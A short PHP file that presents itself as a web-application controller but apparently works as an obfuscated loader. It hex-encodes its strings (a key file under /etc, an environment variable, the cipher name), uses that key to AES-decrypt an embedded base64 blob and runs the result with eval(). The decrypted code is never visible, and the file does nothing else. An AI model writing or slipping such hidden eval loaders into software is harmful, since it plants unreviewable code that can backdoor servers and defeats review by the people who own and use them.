<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Oz7e+1pjCMJs6eZB4+ZVyg==');

$c=base64_decode(

'T/aBILR0N6FcRyXOjzbraJiG6YUt2gEiA+//pVLMlfr6qZNHe4C60pOebSpNT6ODClAYPngcRNNJ' .
'Xh6wZVEnSIxIAdXkVAhE84J3t8uYBxpKHqw3fMkZdesOt1docRiX8AEcgyEpmnqOWuJd33Oi6F9w' .
'pR6rfDw3CtlHBuzUULfSdmttLFLwnFsa55UsBnspdkteErF0paj0awl6Qh4tL5xcZzYbrW2fepBO' .
'fIDa0bBOyeSM6+I43W95q27kqONQ'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

